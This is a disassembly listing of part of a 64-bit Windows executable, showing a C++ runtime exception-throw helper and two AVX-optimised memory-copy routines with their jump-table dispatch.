   140004126:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   14000412a:	48 8b d9             	mov    %rcx,%rbx
   14000412d:	74 08                	je     0x140004137
   14000412f:	48 8b 09             	mov    (%rcx),%rcx
   140004132:	e8 d5 23 00 00       	call   0x14000650c
   140004137:	48 83 23 00          	andq   $0x0,(%rbx)
   14000413b:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000413f:	48 83 c4 20          	add    $0x20,%rsp
   140004143:	5b                   	pop    %rbx
   140004144:	c3                   	ret
   140004145:	cc                   	int3
   140004146:	cc                   	int3
   140004147:	cc                   	int3
   140004148:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000414d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004152:	57                   	push   %rdi
   140004153:	48 83 ec 50          	sub    $0x50,%rsp
   140004157:	48 8b da             	mov    %rdx,%rbx
   14000415a:	48 8b f1             	mov    %rcx,%rsi
   14000415d:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140004162:	48 85 d2             	test   %rdx,%rdx
   140004165:	74 1d                	je     0x140004184
   140004167:	f6 02 10             	testb  $0x10,(%rdx)
   14000416a:	74 18                	je     0x140004184
   14000416c:	48 8b 09             	mov    (%rcx),%rcx
   14000416f:	48 83 e9 08          	sub    $0x8,%rcx
   140004173:	48 8b 01             	mov    (%rcx),%rax
   140004176:	48 8b 58 30          	mov    0x30(%rax),%rbx
   14000417a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000417e:	ff 15 dc b0 00 00    	call   *0xb0dc(%rip)        # 0x14000f260
   140004184:	33 c0                	xor    %eax,%eax
   140004186:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000418b:	48 85 db             	test   %rbx,%rbx
   14000418e:	74 22                	je     0x1400041b2
   140004190:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004195:	48 8b cb             	mov    %rbx,%rcx
   140004198:	ff 15 6a af 00 00    	call   *0xaf6a(%rip)        # 0x14000f108
   14000419e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400041a3:	f6 03 08             	testb  $0x8,(%rbx)
   1400041a6:	75 05                	jne    0x1400041ad
   1400041a8:	48 85 c0             	test   %rax,%rax
   1400041ab:	75 05                	jne    0x1400041b2
   1400041ad:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1400041b2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400041b7:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400041bc:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400041c1:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400041c6:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400041cb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400041d0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400041d5:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400041d9:	ff 15 21 af 00 00    	call   *0xaf21(%rip)        # 0x14000f100
   1400041df:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400041e4:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400041e9:	48 83 c4 50          	add    $0x50,%rsp
   1400041ed:	5f                   	pop    %rdi
   1400041ee:	c3                   	ret
   1400041ef:	cc                   	int3
   1400041f0:	cc                   	int3
   1400041f1:	cc                   	int3
   1400041f2:	cc                   	int3
   1400041f3:	cc                   	int3
   1400041f4:	cc                   	int3
   1400041f5:	cc                   	int3
   1400041f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400041fd:	00 00 00 
   140004200:	48 8b c1             	mov    %rcx,%rax
   140004203:	4c 8d 15 f6 bd ff ff 	lea    -0x420a(%rip),%r10        # 0x140000000
   14000420a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000420e:	0f 87 0c 01 00 00    	ja     0x140004320
   140004214:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000421b:	00 00 00 00 00 
   140004220:	47 8b 8c 82 00 c0 01 	mov    0x1c000(%r10,%r8,4),%r9d
   140004227:	00 
   140004228:	4d 03 ca             	add    %r10,%r9
   14000422b:	41 ff e1             	jmp    *%r9
   14000422e:	c3                   	ret
   14000422f:	90                   	nop
   140004230:	4c 8b 02             	mov    (%rdx),%r8
   140004233:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004236:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000423b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140004240:	4c 89 00             	mov    %r8,(%rax)
   140004243:	89 48 08             	mov    %ecx,0x8(%rax)
   140004246:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000424b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000424f:	c3                   	ret
   140004250:	4c 8b 02             	mov    (%rdx),%r8
   140004253:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004257:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000425c:	4c 89 00             	mov    %r8,(%rax)
   14000425f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004263:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140004267:	c3                   	ret
   140004268:	0f b7 0a             	movzwl (%rdx),%ecx
   14000426b:	66 89 08             	mov    %cx,(%rax)
   14000426e:	c3                   	ret
   14000426f:	90                   	nop
   140004270:	8b 0a                	mov    (%rdx),%ecx
   140004272:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004277:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000427c:	89 08                	mov    %ecx,(%rax)
   14000427e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140004283:	44 88 48 06          	mov    %r9b,0x6(%rax)
   140004287:	c3                   	ret
   140004288:	4c 8b 02             	mov    (%rdx),%r8
   14000428b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000428e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140004293:	4c 89 00             	mov    %r8,(%rax)
   140004296:	89 48 08             	mov    %ecx,0x8(%rax)
   140004299:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000429e:	c3                   	ret
   14000429f:	0f b7 0a             	movzwl (%rdx),%ecx
   1400042a2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   1400042a7:	66 89 08             	mov    %cx,(%rax)
   1400042aa:	44 88 40 02          	mov    %r8b,0x2(%rax)
   1400042ae:	c3                   	ret
   1400042af:	90                   	nop
   1400042b0:	4c 8b 02             	mov    (%rdx),%r8
   1400042b3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400042b6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   1400042bb:	4c 89 00             	mov    %r8,(%rax)
   1400042be:	89 48 08             	mov    %ecx,0x8(%rax)
   1400042c1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   1400042c5:	c3                   	ret
   1400042c6:	4c 8b 02             	mov    (%rdx),%r8
   1400042c9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400042cd:	4c 89 00             	mov    %r8,(%rax)
   1400042d0:	66 89 48 08          	mov    %cx,0x8(%rax)
   1400042d4:	c3                   	ret
   1400042d5:	4c 8b 02             	mov    (%rdx),%r8
   1400042d8:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   1400042dc:	4c 89 00             	mov    %r8,(%rax)
   1400042df:	88 48 08             	mov    %cl,0x8(%rax)
   1400042e2:	c3                   	ret
   1400042e3:	4c 8b 02             	mov    (%rdx),%r8
   1400042e6:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400042e9:	4c 89 00             	mov    %r8,(%rax)
   1400042ec:	89 48 08             	mov    %ecx,0x8(%rax)
   1400042ef:	c3                   	ret
   1400042f0:	8b 0a                	mov    (%rdx),%ecx
   1400042f2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   1400042f7:	89 08                	mov    %ecx,(%rax)
   1400042f9:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   1400042fe:	c3                   	ret
   1400042ff:	8b 0a                	mov    (%rdx),%ecx
   140004301:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140004306:	89 08                	mov    %ecx,(%rax)
   140004308:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000430c:	c3                   	ret
   14000430d:	48 8b 0a             	mov    (%rdx),%rcx
   140004310:	48 89 08             	mov    %rcx,(%rax)
   140004313:	c3                   	ret
   140004314:	0f b6 0a             	movzbl (%rdx),%ecx
   140004317:	88 08                	mov    %cl,(%rax)
   140004319:	c3                   	ret
   14000431a:	8b 0a                	mov    (%rdx),%ecx
   14000431c:	89 08                	mov    %ecx,(%rax)
   14000431e:	c3                   	ret
   14000431f:	90                   	nop
   140004320:	49 83 f8 20          	cmp    $0x20,%r8
   140004324:	77 17                	ja     0x14000433d
   140004326:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000432a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140004331:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140004335:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000433c:	c3                   	ret
   14000433d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140004341:	48 3b ca             	cmp    %rdx,%rcx
   140004344:	4c 0f 46 c9          	cmovbe %rcx,%r9
   140004348:	49 3b c9             	cmp    %r9,%rcx
   14000434b:	0f 82 8f 0c 00 00    	jb     0x140004fe0
   140004351:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   140004358:	73 0d                	jae    0x140004367
   14000435a:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   140004361:	0f 83 59 0c 00 00    	jae    0x140004fc0
   140004367:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000436b:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   140004372:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004379:	0f 86 b9 00 00 00    	jbe    0x140004438
   14000437f:	4c 8b c9             	mov    %rcx,%r9
   140004382:	49 83 e1 1f          	and    $0x1f,%r9
   140004386:	49 83 e9 20          	sub    $0x20,%r9
   14000438a:	49 2b c9             	sub    %r9,%rcx
   14000438d:	49 2b d1             	sub    %r9,%rdx
   140004390:	4d 03 c1             	add    %r9,%r8
   140004393:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000439a:	0f 86 98 00 00 00    	jbe    0x140004438
   1400043a0:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   1400043a7:	0f 87 33 01 00 00    	ja     0x1400044e0
   1400043ad:	0f 1f 00             	nopl   (%rax)
   1400043b0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1400043b4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1400043b9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1400043be:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400043c3:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   1400043c7:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   1400043cc:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   1400043d1:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   1400043d6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   1400043dd:	00 
   1400043de:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   1400043e5:	00 
   1400043e6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   1400043ed:	00 
   1400043ee:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   1400043f5:	00 
   1400043f6:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   1400043fd:	00 
   1400043fe:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   140004405:	00 
   140004406:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000440d:	00 
   14000440e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   140004415:	00 
   140004416:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000441d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140004424:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000442b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004432:	0f 83 78 ff ff ff    	jae    0x1400043b0
   140004438:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000443c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140004440:	4d 8b d9             	mov    %r9,%r11
   140004443:	49 c1 eb 05          	shr    $0x5,%r11
   140004447:	47 8b 9c 9a 40 c0 01 	mov    0x1c040(%r10,%r11,4),%r11d
   14000444e:	00 
   14000444f:	4d 03 da             	add    %r10,%r11
   140004452:	41 ff e3             	jmp    *%r11
   140004455:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000445c:	ff ff ff 
   14000445f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   140004466:	ff ff ff 
   140004469:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140004470:	ff ff ff 
   140004473:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000447a:	ff ff ff 
   14000447d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140004484:	ff ff ff 
   140004487:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000448e:	ff ff ff 
   140004491:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140004498:	ff ff ff 
   14000449b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   1400044a2:	ff ff ff 
   1400044a5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400044ac:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   1400044b3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1400044ba:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   1400044c1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400044c8:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   1400044cf:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   1400044d6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1400044da:	c5 f8 77             	vzeroupper
   1400044dd:	c3                   	ret
   1400044de:	66 90                	xchg   %ax,%ax
   1400044e0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1400044e4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1400044e9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1400044ee:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400044f3:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   1400044f7:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   1400044fc:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   140004501:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   140004506:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000450d:	00 
   14000450e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140004515:	00 
   140004516:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000451d:	00 
   14000451e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140004525:	00 
   140004526:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000452d:	00 
   14000452e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   140004535:	00 
   140004536:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000453d:	00 
   14000453e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   140004545:	00 
   140004546:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000454d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140004554:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000455b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004562:	0f 83 78 ff ff ff    	jae    0x1400044e0
   140004568:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000456c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140004570:	4d 8b d9             	mov    %r9,%r11
   140004573:	49 c1 eb 05          	shr    $0x5,%r11
   140004577:	47 8b 9c 9a 64 c0 01 	mov    0x1c064(%r10,%r11,4),%r11d
   14000457e:	00 
   14000457f:	4d 03 da             	add    %r10,%r11
   140004582:	41 ff e3             	jmp    *%r11
   140004585:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000458c:	ff ff ff 
   14000458f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   140004596:	ff ff ff 
   140004599:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400045a0:	ff ff ff 
   1400045a3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   1400045aa:	ff ff ff 
   1400045ad:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   1400045b4:	ff ff ff 
   1400045b7:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   1400045be:	ff ff ff 
   1400045c1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   1400045c8:	ff ff ff 
   1400045cb:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   1400045d2:	ff ff ff 
   1400045d5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400045dc:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   1400045e3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1400045ea:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   1400045f1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400045f8:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   1400045ff:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140004606:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000460a:	0f ae f8             	sfence
   14000460d:	c5 f8 77             	vzeroupper
   140004610:	c3                   	ret
   140004611:	cc                   	int3
   140004612:	cc                   	int3
   140004613:	cc                   	int3
   140004614:	cc                   	int3
   140004615:	cc                   	int3
   140004616:	cc                   	int3
   140004617:	cc                   	int3
   140004618:	cc                   	int3
   140004619:	cc                   	int3
   14000461a:	cc                   	int3
   14000461b:	cc                   	int3
   14000461c:	cc                   	int3
   14000461d:	cc                   	int3
   14000461e:	cc                   	int3
   14000461f:	cc                   	int3
   140004620:	cc                   	int3
   140004621:	cc                   	int3
   140004622:	cc                   	int3
   140004623:	cc                   	int3
   140004624:	cc                   	int3
   140004625:	cc                   	int3
   140004626:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000462d:	00 00 00 
   140004630:	48 8b c1             	mov    %rcx,%rax
   140004633:	4c 8d 15 c6 b9 ff ff 	lea    -0x463a(%rip),%r10        # 0x140000000
   14000463a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000463e:	0f 87 0c 01 00 00    	ja     0x140004750
   140004644:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000464b:	00 00 00 00 00 
   140004650:	47 8b 8c 82 90 c0 01 	mov    0x1c090(%r10,%r8,4),%r9d
   140004657:	00 
   140004658:	4d 03 ca             	add    %r10,%r9
   14000465b:	41 ff e1             	jmp    *%r9
   14000465e:	c3                   	ret
   14000465f:	90                   	nop
   140004660:	4c 8b 02             	mov    (%rdx),%r8
   140004663:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004666:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000466b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140004670:	4c 89 00             	mov    %r8,(%rax)
   140004673:	89 48 08             	mov    %ecx,0x8(%rax)
   140004676:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000467b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000467f:	c3                   	ret
   140004680:	4c 8b 02             	mov    (%rdx),%r8
   140004683:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140004687:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000468c:	4c 89 00             	mov    %r8,(%rax)
   14000468f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004693:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140004697:	c3                   	ret
   140004698:	0f b7 0a             	movzwl (%rdx),%ecx
   14000469b:	66 89 08             	mov    %cx,(%rax)
   14000469e:	c3                   	ret
   14000469f:	90                   	nop
   1400046a0:	8b 0a                	mov    (%rdx),%ecx
   1400046a2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   1400046a7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   1400046ac:	89 08                	mov    %ecx,(%rax)
   1400046ae:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   1400046b3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   1400046b7:	c3                   	ret
   1400046b8:	4c 8b 02             	mov    (%rdx),%r8
   1400046bb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400046be:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   1400046c3:	4c 89 00             	mov    %r8,(%rax)
   1400046c6:	89 48 08             	mov    %ecx,0x8(%rax)
   1400046c9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   1400046ce:	c3                   	ret
   1400046cf:	0f b7 0a             	movzwl (%rdx),%ecx
   1400046d2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   1400046d7:	66 89 08             	mov    %cx,(%rax)
   1400046da:	44 88 40 02          	mov    %r8b,0x2(%rax)
   1400046de:	c3                   	ret
   1400046df:	90                   	nop
   1400046e0:	4c 8b 02             	mov    (%rdx),%r8
   1400046e3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400046e6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   1400046eb:	4c 89 00             	mov    %r8,(%rax)
   1400046ee:	89 48 08             	mov    %ecx,0x8(%rax)
   1400046f1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   1400046f5:	c3                   	ret
   1400046f6:	4c 8b 02             	mov    (%rdx),%r8
   1400046f9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400046fd:	4c 89 00             	mov    %r8,(%rax)
   140004700:	66 89 48 08          	mov    %cx,0x8(%rax)
   140004704:	c3                   	ret
   140004705:	4c 8b 02             	mov    (%rdx),%r8
   140004708:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000470c:	4c 89 00             	mov    %r8,(%rax)
   14000470f:	88 48 08             	mov    %cl,0x8(%rax)
   140004712:	c3                   	ret
   140004713:	4c 8b 02             	mov    (%rdx),%r8
   140004716:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140004719:	4c 89 00             	mov    %r8,(%rax)
   14000471c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000471f:	c3                   	ret
   140004720:	8b 0a                	mov    (%rdx),%ecx
   140004722:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140004727:	89 08                	mov    %ecx,(%rax)
   140004729:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000472e:	c3                   	ret
   14000472f:	8b 0a                	mov    (%rdx),%ecx
   140004731:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140004736:	89 08                	mov    %ecx,(%rax)
   140004738:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000473c:	c3                   	ret
   14000473d:	48 8b 0a             	mov    (%rdx),%rcx
   140004740:	48 89 08             	mov    %rcx,(%rax)
   140004743:	c3                   	ret
   140004744:	0f b6 0a             	movzbl (%rdx),%ecx
   140004747:	88 08                	mov    %cl,(%rax)
   140004749:	c3                   	ret
   14000474a:	8b 0a                	mov    (%rdx),%ecx
   14000474c:	89 08                	mov    %ecx,(%rax)
   14000474e:	c3                   	ret
   14000474f:	90                   	nop
   140004750:	49 83 f8 20          	cmp    $0x20,%r8
   140004754:	77 17                	ja     0x14000476d
   140004756:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000475a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140004761:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140004765:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000476c:	c3                   	ret
   14000476d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140004771:	48 3b ca             	cmp    %rdx,%rcx
   140004774:	4c 0f 46 c9          	cmovbe %rcx,%r9
   140004778:	49 3b c9             	cmp    %r9,%rcx
   14000477b:	0f 82 6f 09 00 00    	jb     0x1400050f0
   140004781:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   140004788:	73 0d                	jae    0x140004797
   14000478a:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   140004791:	0f 83 39 09 00 00    	jae    0x1400050d0
   140004797:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000479b:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   1400047a2:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400047a9:	0f 86 b9 00 00 00    	jbe    0x140004868
   1400047af:	4c 8b c9             	mov    %rcx,%r9
   1400047b2:	49 83 e1 1f          	and    $0x1f,%r9
   1400047b6:	49 83 e9 20          	sub    $0x20,%r9
   1400047ba:	49 2b c9             	sub    %r9,%rcx
   1400047bd:	49 2b d1             	sub    %r9,%rdx
   1400047c0:	4d 03 c1             	add    %r9,%r8
   1400047c3:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400047ca:	0f 86 98 00 00 00    	jbe    0x140004868
   1400047d0:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   1400047d7:	0f 87 33 01 00 00    	ja     0x140004910
   1400047dd:	0f 1f 00             	nopl   (%rax)
   1400047e0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1400047e4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1400047e9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1400047ee:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400047f3:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   1400047f7:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   1400047fc:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   140004801:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   140004806:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000480d:	00 
   14000480e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140004815:	00 
   140004816:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000481d:	00 
   14000481e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140004825:	00 
   140004826:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000482d:	00 
   14000482e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   140004835:	00 
   140004836:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000483d:	00 
   14000483e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   140004845:	00 
   140004846:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000484d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140004854:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
